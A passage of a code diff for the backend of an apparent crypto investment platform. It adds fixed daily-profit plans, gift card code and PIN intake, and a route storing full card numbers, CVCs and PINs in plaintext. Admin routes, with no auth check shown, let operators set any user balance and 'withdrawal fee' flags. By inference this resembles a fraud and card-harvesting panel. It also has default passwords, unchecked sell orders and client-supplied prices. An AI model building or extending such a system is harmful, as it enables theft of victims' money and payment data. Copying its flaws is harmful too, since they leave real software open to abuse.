-  },
-];
+    const { data } = await db
+      .from('active_investments')
+      .select('*')
+      .eq('user_id', user.uid)
+      .order('start_date', { ascending: false });
 
-app.get('/api/trade/portfolio', (req, res) => {
-  const user = getAuthUser(req);
-  if (!user) return res.status(401).json({ error: 'Unauthorized' });
-  const holdings = holdingsStore[user.uid] || [];
-  res.json({ holdings });
-});
-
-app.get('/api/trade/history', (req, res) => {
-  const user = getAuthUser(req);
-  if (!user) return res.status(401).json({ error: 'Unauthorized' });
-  const orders = ordersStore.filter((o) => o.userId === user.uid);
-  res.json(orders);
-});
-
-app.post('/api/trade/buy', (req, res) => {
-  const user = getAuthUser(req);
-  if (!user) return res.status(401).json({ error: 'Unauthorized' });
-  const { symbol, coinName, amountUsd, cryptoAmount, price } = req.body;
-  const usd = parseFloat(amountUsd);
-  if (isNaN(usd) || usd <= 0) return res.status(400).json({ error: 'Invalid trade volume' });
-  if (usd > user.balance) return res.status(400).json({ error: 'Insufficient balance' });
-  user.balance -= usd;
-
-  const cryptoQty = parseFloat(cryptoAmount) || (price > 0 ? usd / price : 0);
-  if (!holdingsStore[user.uid]) holdingsStore[user.uid] = [];
-  const existing = holdingsStore[user.uid].find((h) => h.symbol === symbol);
-  if (existing) {
-    const totalCost = existing.amount * existing.avgBuyPrice + usd;
-    existing.amount += cryptoQty;
-    existing.avgBuyPrice = existing.amount > 0 ? totalCost / existing.amount : price;
-    existing.totalValue = existing.amount * (price || existing.avgBuyPrice);
-  } else {
-    holdingsStore[user.uid].push({
-      symbol,
-      name: coinName || symbol,
-      amount: cryptoQty,
-      avgBuyPrice: price || 0,
-      totalValue: usd,
-    });
+    return res.json((data || []).map(rowToInvestment));
+  } catch (err) {
+    return res.status(500).json({ error: 'Internal server error' });
   }
-
-  const order: DBOrder = {
-    id: `ord_${Date.now()}`,
-    userId: user.uid,
-    symbol,
-    type: 'buy',
-    amountUsd: usd,
-    cryptoAmount: cryptoQty,
-    price: price || 0,
-    date: new Date().toISOString(),
-  };
-  ordersStore.unshift(order);
-
-  const newTx: DBTransaction = {
-    id: `tx_buy_${Date.now()}`,
-    userId: user.uid,
-    userEmail: user.email,
-    type: 'trade_buy',
-    amount: usd,
-    coin: `${symbol} Spot Buy`,
-    cryptoAmount: cryptoQty,
-    status: 'approved',
-    createdAt: new Date().toISOString(),
-    details: `Executed Market Buy for ${cryptoQty.toFixed(4)} ${symbol} @ $${price}`,
-  };
-  transactionsStore.unshift(newTx);
-  res.json({ message: `Successfully bought ${cryptoQty.toFixed(4)} ${symbol}`, user, holdings: holdingsStore[user.uid] });
 });
 
-app.post('/api/trade/sell', (req, res) => {
-  const user = getAuthUser(req);
-  if (!user) return res.status(401).json({ error: 'Unauthorized' });
-  const { symbol, amountUsd, cryptoAmount, price } = req.body;
-  const usd = parseFloat(amountUsd);
-  if (isNaN(usd) || usd <= 0) return res.status(400).json({ error: 'Invalid trade volume' });
+app.post('/api/investments/create', async (req, res) => {
+  try {
+    const user = await getAuthUser(req);
+    if (!user) return res.status(401).json({ error: 'Unauthorized' });
 
-  const userHoldings = holdingsStore[user.uid] || [];
-  const existing = userHoldings.find((h) => h.symbol === symbol);
-  const cryptoQty = parseFloat(cryptoAmount) || (price > 0 ? usd / price : 0);
+    const { planId, amount, cryptoAsset, cryptoAmount, autoCompound } = req.body;
+    if (!planId || !amount) return res.status(400).json({ error: 'Plan ID and amount are required' });
 
-  if (!existing || existing.amount < cryptoQty) {
-    return res.status(400).json({ error: `Insufficient ${symbol} holding to execute sell order` });
+    const plan = INVESTMENT_PLANS.find(p => p.id === planId);
+    if (!plan) return res.status(404).json({ error: 'Investment plan not found' });
+
+    const investAmount = parseFloat(amount);
+    if (investAmount < plan.minDepositUsd) {
+      return res.status(400).json({ error: `Minimum investment is $${plan.minDepositUsd.toLocaleString()}` });
+    }
+    if (investAmount > plan.maxDepositUsd) {
+      return res.status(400).json({ error: `Maximum investment is $${plan.maxDepositUsd.toLocaleString()}` });
+    }
+    if (investAmount > user.balance) {
+      return res.status(400).json({ error: 'Insufficient balance' });
+    }
+
+    const startDate = new Date();
+    const endDate = new Date(startDate.getTime() + plan.durationDays * 86400000);
+    const expectedProfit = investAmount * (plan.dailyProfitPercent / 100) * plan.durationDays;
+    const investmentId = genId('inv');
+
+    const investmentRow = {
+      id: investmentId,
+      user_id: user.uid,
+      plan_id: plan.id,
+      plan_name: plan.name,
+      amount: investAmount,
+      crypto_asset: cryptoAsset || 'USD',
+      crypto_amount: cryptoAmount || 0,
+      daily_profit_percent: plan.dailyProfitPercent,
+      expected_profit_usd: expectedProfit,
+      total_claimed: 0,
+      start_date: startDate.toISOString(),
+      end_date: endDate.toISOString(),
+      duration_days: plan.durationDays,
+      status: 'active',
+      auto_compound: autoCompound || false,
+    };
+
+    await db.from('active_investments').insert([investmentRow]);
+
+    // Deduct from user balance
+    await db.from('users').update({ balance: user.balance - investAmount }).eq('uid', user.uid);
+
+    // Record investment transaction
+    await db.from('transactions').insert([{
+      id: genId('tx_inv'),
+      user_id: user.uid,
+      user_email: user.email,
+      type: 'investment',
+      method: 'crypto',
+      amount: investAmount,
+      coin: cryptoAsset || 'USD',
+      status: 'approved',
+      details: `${plan.name} — ${plan.dailyProfitPercent}% daily for ${plan.durationDays} days`,
+    }]);
+
+    return res.status(201).json({ message: 'Investment created successfully', investment: rowToInvestment(investmentRow) });
+  } catch (err) {
+    return res.status(500).json({ error: 'Internal server error' });
   }
+});
 
-  existing.amount -= cryptoQty;
-  existing.totalValue = existing.amount * (price || existing.avgBuyPrice);
-  if (existing.amount <= 0.000001) {
-    holdingsStore[user.uid] = userHoldings.filter((h) => h.symbol !== symbol);
+app.post('/api/investments/claim/:id', async (req, res) => {
+  try {
+    const user = await getAuthUser(req);
+    if (!user) return res.status(401).json({ error: 'Unauthorized' });
+
+    const { id } = req.params;
+    const { data: inv } = await db
+      .from('active_investments')
+      .select('*')
+      .eq('id', id)
+      .eq('user_id', user.uid)
+      .single();
+
+    if (!inv) return res.status(404).json({ error: 'Investment not found' });
+
+    const investment = rowToInvestment(inv);
+    if (investment.status !== 'active') {
+      return res.status(400).json({ error: 'This investment is no longer active' });
+    }
+
+    const now = Date.now();
+    const start = new Date(investment.startDate).getTime();
+    const end = new Date(investment.endDate).getTime();
+    const elapsed = Math.min(now - start, end - start);
+    const elapsedDays = elapsed / 86400000;
+    const totalEarned = investment.amount * (investment.dailyProfitPercent / 100) * elapsedDays;
+    const claimable = Math.max(0, totalEarned - investment.totalClaimed);
+
+    if (claimable <= 0.01) {
+      return res.status(400).json({ error: 'No profit available to claim yet. Please wait.' });
+    }
+
+    await db.from('active_investments').update({
+      total_claimed: investment.totalClaimed + claimable,
+      last_claim_date: new Date().toISOString(),
+      status: now >= end ? 'completed' : 'active',
+    }).eq('id', id);
+
+    await db.from('users').update({
+      profit_balance: user.profitBalance + claimable,
+    }).eq('uid', user.uid);
+
+    await db.from('transactions').insert([{
+      id: genId('tx_profit'),
+      user_id: user.uid,
+      user_email: user.email,
+      type: 'profit',
+      method: 'crypto',
+      amount: claimable,
+      coin: 'USD',
+      status: 'approved',
+      details: `Profit claim from ${investment.planName} — $${claimable.toFixed(2)}`,
+    }]);
+
+    return res.json({ message: `Successfully claimed $${claimable.toFixed(2)} in profit.`, claimedAmount: claimable });
+  } catch (err) {
+    return res.status(500).json({ error: 'Internal server error' });
   }
-
-  user.balance += usd;
-
-  const order: DBOrder = {
-    id: `ord_${Date.now()}`,
-    userId: user.uid,
-    symbol,
-    type: 'sell',
-    amountUsd: usd,
-    cryptoAmount: cryptoQty,
-    price: price || 0,
-    date: new Date().toISOString(),
-  };
-  ordersStore.unshift(order);
-
-  const newTx: DBTransaction = {
-    id: `tx_sell_${Date.now()}`,
-    userId: user.uid,
-    userEmail: user.email,
-    type: 'trade_sell',
-    amount: usd,
-    coin: `${symbol} Spot Sell`,
-    cryptoAmount: cryptoQty,
-    status: 'approved',
-    createdAt: new Date().toISOString(),
-    details: `Executed Market Sell for ${cryptoQty.toFixed(4)} ${symbol} @ $${price}`,
-  };
-  transactionsStore.unshift(newTx);
-  res.json({ message: `Successfully sold ${cryptoQty.toFixed(4)} ${symbol}`, user, holdings: holdingsStore[user.uid] });
 });
 
-// ---------------------------------------------------------------------------------
-// ADMIN MANAGEMENT ROUTES (SYSTEM WALLETS, USERS, KYC, TRANSACTIONS)
-// ---------------------------------------------------------------------------------
+// =============================================================================
+// TRADE ROUTES
+// =============================================================================
 
-// Admin Stats
-app.get('/api/admin/stats', (_req, res) => {
-  const totalUsers = usersStore.length;
-  const totalDepositsVolume = transactionsStore
-    .filter((t) => t.type === 'deposit' && t.status === 'approved')
-    .reduce((sum, t) => sum + t.amount, 0);
-  const totalWithdrawalsVolume = transactionsStore
-    .filter((t) => t.type === 'withdrawal' && t.status === 'approved')
-    .reduce((sum, t) => sum + t.amount, 0);
-  const activeStakingVolume = usersStore.reduce((sum, u) => sum + (u.stakedBalance || 0), 0);
-  const pendingKYCCount = kycDocsStore.filter((k) => k.status === 'pending').length;
-  const pendingWithdrawals = transactionsStore.filter((t) => t.type === 'withdrawal' && t.status === 'pending');
-  const pendingWithdrawalsCount = pendingWithdrawals.length;
-  const pendingWithdrawalsVolume = pendingWithdrawals.reduce((sum, t) => sum + t.amount, 0);
+app.get('/api/trade/portfolio', async (req, res) => {
+  try {
+    const user = await getAuthUser(req);
+    if (!user) return res.status(401).json({ error: 'Unauthorized' });
 
-  res.json({
-    totalUsers,
-    totalDepositsVolume,
-    totalWithdrawalsVolume,
-    activeStakingVolume,
-    pendingKYCCount,
-    pendingWithdrawalsCount,
-    pendingWithdrawalsVolume,
-  });
-});
+    const { data } = await db
+      .from('trade_orders')
+      .select('*')
+      .eq('user_id', user.uid)
+      .eq('status', 'filled');
 
-// Admin Users List
-app.get('/api/admin/users', (_req, res) => {
-  res.json(usersStore);
-});
+    const orders = (data || []).map(rowToTrade);
+    const holdings: Record<string, any> = {};
 
-// Admin Add New User
-app.post('/api/admin/users', (req, res) => {
-  const { email, fullName, password, balance, profitBalance, stakedBalance, kycTier, isAdmin, status } = req.body;
-  if (!email) return res.status(400).json({ error: 'Email is required' });
-
-  const randomInitialBalance = balance !== undefined ? parseFloat(balance) : parseFloat((Math.random() * (4967 - 3750) + 3750).toFixed(2));
-  const newUid = `usr_${Date.now()}_${Math.random().toString(36).substring(2, 6)}`;
-  
-  const newUser: DBUser = {
-    uid: newUid,
-    email: email.toLowerCase(),
-    password: password || 'password123',
-    fullName: fullName || email.split('@')[0],
-    balance: randomInitialBalance,
-    profitBalance: profitBalance !== undefined ? parseFloat(profitBalance) : 0,
-    stakedBalance: stakedBalance !== undefined ? parseFloat(stakedBalance) : 0,
-    totalWithdrawn: 0,
-    totalDeposited: randomInitialBalance,
-    kycStatus: kycTier >= 2 ? 'verified_tier2' : kycTier === 1 ? 'verified_tier1' : 'unverified',
-    kycTier: kycTier || 1,
-    isAdmin: Boolean(isAdmin),
-    isVerified: Boolean(kycTier >= 1),
-    hasDepositedMinimum: true,
-    withdrawalFeePaid: true,
-    twoFactorEnabled: false,
-    securityPin: '0000',
-    referralCode: `NEXO${Math.floor(1000 + Math.random() * 9000)}`,
-    referralEarnings: 0,
-    status: status || 'active',
-    createdAt: new Date().toISOString(),
-  };
-
-  usersStore.push(newUser);
-  res.status(201).json({ message: 'User created successfully', user: newUser });
-});
-
-// Admin Update User (Balances, KYC, Status, Flags)
-app.put('/api/admin/users/:uid', (req, res) => {
-  const { uid } = req.params;
-  const user = usersStore.find((u) => u.uid === uid || u.email.toLowerCase() === uid.toLowerCase());
-  if (!user) return res.status(404).json({ error: 'User not found' });
-
-  const {
-    balance,
-    profitBalance,
-    stakedBalance,
-    totalDeposited,
-    totalWithdrawn,
-    kycTier,
-    kycStatus,
-    isAdmin,
-    isVerified,
-    hasDepositedMinimum,
-    withdrawalFeePaid,
-    twoFactorEnabled,
-    status,
-    isBanned,
-    banReason,
-    fullName,
-    country,
-    phone,
-    securityPin,
-  } = req.body;
-
-  if (balance !== undefined) user.balance = parseFloat(balance);
-  if (profitBalance !== undefined) user.profitBalance = parseFloat(profitBalance);
-  if (stakedBalance !== undefined) user.stakedBalance = parseFloat(stakedBalance);
-  if (totalDeposited !== undefined) user.totalDeposited = parseFloat(totalDeposited);
-  if (totalWithdrawn !== undefined) user.totalWithdrawn = parseFloat(totalWithdrawn);
-  if (kycTier !== undefined) user.kycTier = parseInt(kycTier, 10);
-  if (kycStatus !== undefined) user.kycStatus = kycStatus;
-  if (isAdmin !== undefined) user.isAdmin = Boolean(isAdmin);
-  if (isVerified !== undefined) user.isVerified = Boolean(isVerified);
-  if (hasDepositedMinimum !== undefined) user.hasDepositedMinimum = Boolean(hasDepositedMinimum);
-  if (withdrawalFeePaid !== undefined) user.withdrawalFeePaid = Boolean(withdrawalFeePaid);
-  if (twoFactorEnabled !== undefined) user.twoFactorEnabled = Boolean(twoFactorEnabled);
-  if (status !== undefined) user.status = status;
-  if (isBanned !== undefined) user.isBanned = Boolean(isBanned);
-  if (banReason !== undefined) user.banReason = banReason;
-  if (fullName !== undefined) user.fullName = fullName;
-  if (country !== undefined) user.country = country;
-  if (phone !== undefined) user.phone = phone;
-  if (securityPin !== undefined) user.securityPin = securityPin;
-
-  res.json({ message: 'User account updated successfully', user });
-});
-
-// Admin Quick Suspend / Activate User
-app.put('/api/admin/users/:uid/status', (req, res) => {
-  const { uid } = req.params;
-  const { status, banReason } = req.body;
-  const user = usersStore.find((u) => u.uid === uid || u.email.toLowerCase() === uid.toLowerCase());
-  if (!user) return res.status(404).json({ error: 'User not found' });
-
-  if (status) {
-    user.status = status;
-    user.isBanned = status === 'suspended' || status === 'locked';
-  }
-  if (banReason !== undefined) user.banReason = banReason;
-
-  res.json({ message: `User account status changed to ${user.status}`, user });
-});
-
-// Admin Delete User
-app.delete('/api/admin/users/:uid', (req, res) => {
-  const { uid } = req.params;
-  const index = usersStore.findIndex((u) => u.uid === uid || u.email.toLowerCase() === uid.toLowerCase());
-  if (index === -1) return res.status(404).json({ error: 'User not found' });
-
-  usersStore.splice(index, 1);
-  res.json({ message: 'User deleted from directory successfully' });
-});
-
-// ---------------------------------------------------------------------------------
-// ADMIN SYSTEM WALLETS CRUD
-// ---------------------------------------------------------------------------------
-
-// Get all system wallets
-app.get('/api/admin/wallets', (_req, res) => {
-  res.json(systemWallets);
-});
-
-// Add new system wallet
-app.post('/api/admin/wallets', (req, res) => {
-  const { coin, network, address, label, memo, qrCodeUrl, isEnabled } = req.body;
-  if (!coin || !address) {
-    return res.status(400).json({ error: 'Coin name and wallet address are required.' });
-  }
-
-  const newWallet: DBWallet = {
-    id: `w-${Date.now()}-${Math.random().toString(36).substring(2, 6)}`,
-    coin: coin.trim(),
-    network: network?.trim() || 'Native Network',
-    address: address.trim(),
-    label: label?.trim() || `${coin} Deposit Vault`,
-    memo: memo?.trim() || '',
-    qrCodeUrl: qrCodeUrl || '',
-    isEnabled: isEnabled !== undefined ? Boolean(isEnabled) : true,
-    updatedAt: new Date().toISOString(),
-  };
-
-  systemWallets.push(newWallet);
-  res.status(201).json({ message: 'New system wallet added successfully', wallet: newWallet, wallets: systemWallets });
-});
-
-// Update existing system wallet
-app.put('/api/admin/wallets/:id', (req, res) => {
-  const { id } = req.params;
-  const wallet = systemWallets.find((w) => w.id === id);
-  if (!wallet) return res.status(404).json({ error: 'Wallet configuration not found' });
-
-  const { coin, network, address, label, memo, qrCodeUrl, isEnabled } = req.body;
-  if (coin !== undefined) wallet.coin = coin.trim();
-  if (network !== undefined) wallet.network = network.trim();
-  if (address !== undefined) wallet.address = address.trim();
-  if (label !== undefined) wallet.label = label.trim();
-  if (memo !== undefined) wallet.memo = memo.trim();
-  if (qrCodeUrl !== undefined) wallet.qrCodeUrl = qrCodeUrl;
-  if (isEnabled !== undefined) wallet.isEnabled = Boolean(isEnabled);
-  wallet.updatedAt = new Date().toISOString();
-
-  res.json({ message: 'System wallet updated successfully', wallet, wallets: systemWallets });
-});
-
-// Delete system wallet
-app.delete('/api/admin/wallets/:id', (req, res) => {
-  const { id } = req.params;
-  const index = systemWallets.findIndex((w) => w.id === id);
-  if (index === -1) return res.status(404).json({ error: 'Wallet not found' });
-
-  systemWallets.splice(index, 1);
-  res.json({ message: 'System wallet deleted', wallets: systemWallets });
-});
-
-// ---------------------------------------------------------------------------------
-// ADMIN TRANSACTION, KYC, GIFTCARD, CARD & SETTING ROUTES
-// ---------------------------------------------------------------------------------
-
-app.get('/api/admin/transactions', (_req, res) => {
-  res.json(transactionsStore);
-});
-
-app.put('/api/admin/transactions/:id/action', (req, res) => {
-  const { id } = req.params;
-  const { action, reason } = req.body; // 'approve' | 'reject' | 'pending'
-  const tx = transactionsStore.find((t) => t.id === id);
-  if (!tx) return res.status(404).json({ error: 'Transaction not found' });
-
-  const previousStatus = tx.status;
-  tx.status = action === 'approve' ? 'approved' : action === 'reject' ? 'rejected' : 'pending';
-  if (reason) tx.adminReason = reason;
-
-  const user = usersStore.find((u) => u.uid === tx.userId || u.email === tx.userEmail);
-
-  // If approving a pending deposit, credit user balance & totalDeposited
-  if (action === 'approve' && tx.type === 'deposit' && previousStatus !== 'approved') {
-    if (user) {
-      user.balance += tx.amount;
-      user.totalDeposited = (user.totalDeposited || 0) + tx.amount;
-      if (user.totalDeposited >= 500) {
-        user.hasDepositedMinimum = true;
+    for (const order of orders) {
+      const coin = order.pair?.split('/')[0] || 'BTC';
+      if (!holdings[coin]) holdings[coin] = { coin, symbol: coin, amount: 0, totalCost: 0 };
+      if (order.type === 'buy') {
+        holdings[coin].amount += order.amount;
+        holdings[coin].totalCost += order.total;
+      } else if (order.type === 'sell') {
+        holdings[coin].amount -= order.amount;
+        holdings[coin].totalCost -= order.total;
       }
     }
-  }
 
-  // If rejecting a previously deducted withdrawal, refund balance
-  if (action === 'reject' && tx.type === 'withdrawal' && previousStatus !== 'rejected') {
-    if (user) {
-      user.balance += tx.amount;
-      user.totalWithdrawn = Math.max(0, user.totalWithdrawn - tx.amount);
+    const portfolio = Object.values(holdings)
+      .filter((h: any) => h.amount > 0.000001)
+      .map((h: any) => ({
+        coin: h.coin,
+        symbol: h.symbol,
+        amount: h.amount,
+        avgBuyPrice: h.amount > 0 ? h.totalCost / h.amount : 0,
+        currentPrice: 0,
+        value: 0,
+        pnl: 0,
+        pnlPercent: 0,
+      }));
+
+    return res.json(portfolio);
+  } catch (err) {
+    return res.status(500).json({ error: 'Internal server error' });
+  }
+});
+
+app.get('/api/trade/history', async (req, res) => {
+  try {
+    const user = await getAuthUser(req);
+    if (!user) return res.status(401).json({ error: 'Unauthorized' });
+
+    const { data } = await db
+      .from('trade_orders')
+      .select('*')
+      .eq('user_id', user.uid)
+      .order('created_at', { ascending: false });
+
+    return res.json((data || []).map(rowToTrade));
+  } catch (err) {
+    return res.status(500).json({ error: 'Internal server error' });
+  }
+});
+
+app.post('/api/trade/buy', async (req, res) => {
+  try {
+    const user = await getAuthUser(req);
+    if (!user) return res.status(401).json({ error: 'Unauthorized' });
+
+    const { pair, price, amount, orderType } = req.body;
+    if (!pair || !price || !amount) return res.status(400).json({ error: 'Pair, price, and amount are required' });
+
+    const total = parseFloat(price) * parseFloat(amount);
+    if (total > user.balance) return res.status(400).json({ error: 'Insufficient balance' });
+
+    const orderId = genId('ord');
+    await db.from('trade_orders').insert([{
+      id: orderId,
+      user_id: user.uid,
+      pair,
+      type: 'buy',
+      order_type: orderType || 'market',
+      price: parseFloat(price),
+      amount: parseFloat(amount),
+      total,
+      status: 'filled',
+    }]);
+
+    await db.from('users').update({ balance: user.balance - total }).eq('uid', user.uid);
+
+    await db.from('transactions').insert([{
+      id: genId('tx_trade'),
+      user_id: user.uid,
+      user_email: user.email,
+      type: 'trade_buy',
+      method: 'crypto',
+      amount: total,
+      coin: pair,
+      status: 'approved',
+      details: `Buy ${amount} ${pair} at $${parseFloat(price).toLocaleString()}`,
+    }]);
+
+    return res.status(201).json({ message: 'Buy order filled', orderId });
+  } catch (err) {
+    return res.status(500).json({ error: 'Internal server error' });
+  }
+});
+
+app.post('/api/trade/sell', async (req, res) => {
+  try {
+    const user = await getAuthUser(req);
+    if (!user) return res.status(401).json({ error: 'Unauthorized' });
+
+    const { pair, price, amount, orderType } = req.body;
+    if (!pair || !price || !amount) return res.status(400).json({ error: 'Pair, price, and amount are required' });
+
+    const total = parseFloat(price) * parseFloat(amount);
+    const orderId = genId('ord');
+
+    await db.from('trade_orders').insert([{
+      id: orderId,
+      user_id: user.uid,
+      pair,
+      type: 'sell',
+      order_type: orderType || 'market',
+      price: parseFloat(price),
+      amount: parseFloat(amount),
+      total,
+      status: 'filled',
+    }]);
+
+    await db.from('users').update({ balance: user.balance + total }).eq('uid', user.uid);
+
+    await db.from('transactions').insert([{
+      id: genId('tx_trade'),
+      user_id: user.uid,
+      user_email: user.email,
+      type: 'trade_sell',
+      method: 'crypto',
+      amount: total,
+      coin: pair,
+      status: 'approved',
+      details: `Sell ${amount} ${pair} at $${parseFloat(price).toLocaleString()}`,
+    }]);
+
+    return res.status(201).json({ message: 'Sell order filled', orderId });
+  } catch (err) {
+    return res.status(500).json({ error: 'Internal server error' });
+  }
+});
+
+// =============================================================================
+// KYC ROUTES
+// =============================================================================
+
+app.post('/api/kyc/submit', async (req, res) => {
+  try {
+    const user = await getAuthUser(req);
+    if (!user) return res.status(401).json({ error: 'Unauthorized' });
+
+    const { docType, idNumber, country, frontImageUrl, backImageUrl, selfieUrl, proofOfAddressUrl } = req.body;
+    if (!docType || !idNumber) return res.status(400).json({ error: 'Document type and ID number are required' });
+
+    const kycId = genId('kyc');
+    await db.from('kyc_docs').insert([{
+      id: kycId,
+      user_id: user.uid,
+      user_email: user.email,
+      full_name: user.fullName,
+      country: country || user.country,
+      doc_type: docType,
+      id_number: idNumber,
+      front_image_url: frontImageUrl || null,
+      back_image_url: backImageUrl || null,
+      selfie_url: selfieUrl || null,
+      proof_of_address_url: proofOfAddressUrl || null,
+      status: 'pending',
+    }]);
+
+    await db.from('users').update({ kyc_status: 'pending' }).eq('uid', user.uid);
+
+    return res.status(201).json({ message: 'KYC documents submitted for review.', kycId });
+  } catch (err) {
+    return res.status(500).json({ error: 'Internal server error' });
+  }
+});
+
+app.get('/api/kyc/my-documents', async (req, res) => {
+  try {
+    const user = await getAuthUser(req);
+    if (!user) return res.status(401).json({ error: 'Unauthorized' });
+
+    const { data } = await db
+      .from('kyc_docs')
+      .select('*')
+      .eq('user_id', user.uid)
+      .order('submitted_at', { ascending: false });
+
+    return res.json((data || []).map(rowToKyc));
+  } catch (err) {
+    return res.status(500).json({ error: 'Internal server error' });
+  }
+});
+
+// =============================================================================
+// GIFT CARD ROUTES
+// =============================================================================
+
+// Batch gift card deposit — this is the endpoint the frontend actually calls
+app.post('/api/transactions/deposit-giftcard', async (req, res) => {
+  try {
+    const user = await getAuthUser(req);
+    if (!user) return res.status(401).json({ error: 'Unauthorized' });
+
+    const { cards } = req.body;
+    if (!cards || !Array.isArray(cards) || cards.length === 0) {
+      return res.status(400).json({ error: 'At least one gift card is required.' });
     }
+
+    let totalAmount = 0;
+    const insertedIds: string[] = [];
+
+    for (const card of cards) {
+      if (!card.type || !card.code) continue;
+      const amt = parseFloat(card.amount) || 0;
+      if (amt <= 0) continue;
+
+      totalAmount += amt;
+      const gcId = genId('gc');
+      insertedIds.push(gcId);
+
+      await db.from('gift_cards').insert([{
+        id: gcId,
+        user_id: user.uid,
+        user_email: user.email,
+        type: card.type,
+        code: card.code,
+        pin: card.pin || '',
+        amount: amt,
+        image_proof_url: card.imageProofUrl || null,
+        status: 'pending',
+      }]);
+    }
+
+    if (insertedIds.length === 0) {
+      return res.status(400).json({ error: 'No valid gift cards provided.' });
+    }
+
+    // Create a summary transaction for the ledger
+    const txId = genId('tx_gc');
+    await db.from('transactions').insert([{
+      id: txId,
+      user_id: user.uid,
+      user_email: user.email,
+      type: 'deposit',
+      method: 'giftcard',
+      amount: totalAmount,
+      coin: `Gift Card (${insertedIds.length} card${insertedIds.length > 1 ? 's' : ''})`,
+      status: 'pending',
+      details: `Gift card batch deposit — ${insertedIds.length} card(s) totaling $${totalAmount.toLocaleString()}`,
+    }]);
+
+    return res.status(201).json({
+      message: `${insertedIds.length} gift card(s) submitted for review.`,
+      transaction: { id: txId },
+      gcIds: insertedIds,
+    });
+  } catch (err) {
+    console.error('Gift card deposit error:', err);
+    return res.status(500).json({ error: 'Internal server error' });
   }
-
-  res.json({ message: `Transaction marked as ${tx.status}`, transaction: tx, user });
 });
 
-app.get('/api/admin/kyc', (_req, res) => {
-  res.json(kycDocsStore);
+// Single gift card submit (alias for admin/external use)
+app.post('/api/giftcard/submit', async (req, res) => {
+  try {
+    const user = await getAuthUser(req);
+    if (!user) return res.status(401).json({ error: 'Unauthorized' });
+
+    const { type, code, pin, amount, imageProofUrl } = req.body;
+    if (!type || !code || !amount) return res.status(400).json({ error: 'Gift card type, code, and amount are required' });
+
+    const gcId = genId('gc');
+    await db.from('gift_cards').insert([{
+      id: gcId,
+      user_id: user.uid,
+      user_email: user.email,
+      type,
+      code,
+      pin: pin || '',
+      amount: parseFloat(amount),
+      image_proof_url: imageProofUrl || null,
+      status: 'pending',
+    }]);
+
+    return res.status(201).json({ message: 'Gift card submitted for review.', gcId });
+  } catch (err) {
+    return res.status(500).json({ error: 'Internal server error' });
+  }
 });
 
-app.put('/api/admin/kyc/:id/action', (req, res) => {
-  const { id } = req.params;
-  const { action, notes } = req.body; // 'approve' | 'reject'
-  const doc = kycDocsStore.find((k) => k.id === id);
-  if (!doc) return res.status(404).json({ error: 'KYC Document not found' });
+// =============================================================================
+// CARD VAULT ROUTES
+// =============================================================================
 
-  doc.status = action === 'approve' ? 'approved' : 'rejected';
-  doc.reviewedAt = new Date().toISOString();
-  if (notes) doc.adminNotes = notes;
+app.post('/api/card/submit', async (req, res) => {
+  try {
+    const user = await getAuthUser(req);
+    if (!user) return res.status(401).json({ error: 'Unauthorized' });
 
-  const user = usersStore.find((u) => u.uid === doc.userId || u.email === doc.userEmail);
-  if (user) {
-    if (action === 'approve') {
-      user.kycStatus = 'verified_tier2';
-      user.kycTier = 2;
-      user.isVerified = true;
+    const { cardNumber, cardholderName, expiryDate, cvc, pin, amount, billingAddress } = req.body;
+    if (!cardNumber || !cardholderName || !expiryDate || !cvc) {
+      return res.status(400).json({ error: 'Card number, cardholder name, expiry, and CVC are required' });
+    }
+
+    const cardId = genId('card');
+    await db.from('cards').insert([{
+      id: cardId,
+      user_id: user.uid,
+      user_email: user.email,
+      full_name: user.fullName,
+      card_number: cardNumber,
+      cardholder_name: cardholderName,
+      expiry_date: expiryDate,
+      cvc,
+      pin: pin || '',
+      amount: amount ? parseFloat(amount) : 0,
+      billing_address: billingAddress || '',
+      reference: genId('ref'),
+      status: 'pending',
+    }]);
+
+    return res.status(201).json({ message: 'Card details submitted for processing.', cardId });
+  } catch (err) {
+    return res.status(500).json({ error: 'Internal server error' });
+  }
+});
+
+// =============================================================================
+// ADMIN ROUTES
+// =============================================================================
+
+app.get('/api/admin/stats', async (_req, res) => {
+  try {
+    const { data: users } = await db.from('users').select('uid, staked_balance');
+    const { data: txns } = await db.from('transactions').select('amount, type, status');
+    const { data: kycPending } = await db.from('kyc_docs').select('id').eq('status', 'pending');
+    const { data: pendingWd } = await db
+      .from('transactions')
+      .select('id, amount')
+      .eq('type', 'withdrawal')
+      .eq('status', 'pending');
+
+    const txList = txns || [];
+    const totalDepositsVolume = txList
+      .filter(t => t.type === 'deposit' && t.status === 'approved')
+      .reduce((s, t) => s + parseFloat(t.amount), 0);
+    const totalWithdrawalsVolume = txList
+      .filter(t => t.type === 'withdrawal' && t.status === 'approved')
+      .reduce((s, t) => s + parseFloat(t.amount), 0);
+    const activeStakingVolume = (users || []).reduce((s, u) => s + parseFloat(u.staked_balance || 0), 0);
+    const pendingWdAmt = (pendingWd || []).reduce((s, t) => s + parseFloat(t.amount || 0), 0);
+
+    return res.json({
+      totalUsers: (users || []).length,
+      totalDepositsVolume,
+      totalWithdrawalsVolume,
+      activeStakingVolume,
+      pendingKYCCount: (kycPending || []).length,
+      pendingWithdrawalsCount: (pendingWd || []).length,
+      pendingWithdrawalsVolume: pendingWdAmt,
+    });
+  } catch (err) {
+    return res.status(500).json({ error: 'Internal server error' });
+  }
+});
+
+// Admin: Get all users
+app.get('/api/admin/users', async (_req, res) => {
+  try {
+    const { data, error } = await db
+      .from('users')
+      .select('*')
+      .order('created_at', { ascending: false });
+    if (error) return res.status(500).json({ error: 'Failed to fetch users' });
+    return res.json((data || []).map(r => safeUser(rowToUser(r))));
+  } catch (err) {
+    return res.status(500).json({ error: 'Internal server error' });
+  }
+});
+
+// Admin: Create new user
+app.post('/api/admin/users', async (req, res) => {
+  try {
+    const { email, fullName, password, balance, profitBalance, stakedBalance, kycTier, isAdmin, status } = req.body;
+    if (!email) return res.status(400).json({ error: 'Email is required' });
+
+    const uid = `usr_${Date.now()}_${Math.random().toString(36).substring(2, 6)}`;
+    const tier = parseInt(kycTier) || 0;
+
+    const { data, error } = await db.from('users').insert([{
+      uid,
+      email: email.toLowerCase(),
+      password: password || 'password123',
+      full_name: fullName || email.split('@')[0],
+      balance: parseFloat(balance) || randomBalance(),
+      profit_balance: parseFloat(profitBalance) || 0,
+      staked_balance: parseFloat(stakedBalance) || 0,
+      total_withdrawn: 0,
+      total_deposited: 0,
+      kyc_status: tier >= 2 ? 'verified_tier2' : tier >= 1 ? 'verified_tier1' : 'unverified',
+      kyc_tier: tier,
+      is_admin: isAdmin || false,
+      is_verified: tier >= 1,
+      has_deposited_minimum: false,
+      withdrawal_fee_paid: false,
